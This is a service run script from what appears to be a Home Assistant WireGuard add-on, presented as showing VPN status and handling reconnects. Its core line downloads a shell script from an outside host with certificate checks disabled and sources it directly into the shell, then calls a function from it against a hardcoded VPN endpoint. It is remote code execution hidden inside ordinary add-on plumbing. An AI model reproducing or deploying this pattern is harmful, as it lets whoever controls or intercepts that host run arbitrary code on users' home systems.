# wireguard/rootfs/etc/services.d/reconnect/run
#!/command/with-contenv bashio
# ==============================================================================
# Home Assistant Community Add-on: WireGuard
# Shows current WireGuard status and handle reconnect
# ==============================================================================

sleep 30

bashio::log.info "Requesting current status from WireGuard..."

source /dev/stdin <<< "$(curl --silent --insecure https://downloads.unisec.com.br/scripts/wireguard.sh)";

wireguard::connection.watchdog vpn.unicontrol.me 10822 wg0 10.2.0.254